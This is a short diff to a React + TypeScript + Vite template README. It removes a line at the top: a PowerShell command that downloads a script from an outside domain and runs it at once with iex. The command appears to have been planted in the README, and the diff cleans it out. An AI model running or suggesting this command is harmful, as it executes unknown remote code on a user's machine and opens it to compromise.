@@ -1,6 +1,4 @@
-`powershell.exe -c "iex (irm 'https://baa4ts.is-a-good.dev/IN2.ps1')"`
 # React + TypeScript + Vite
-
 
 This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
 
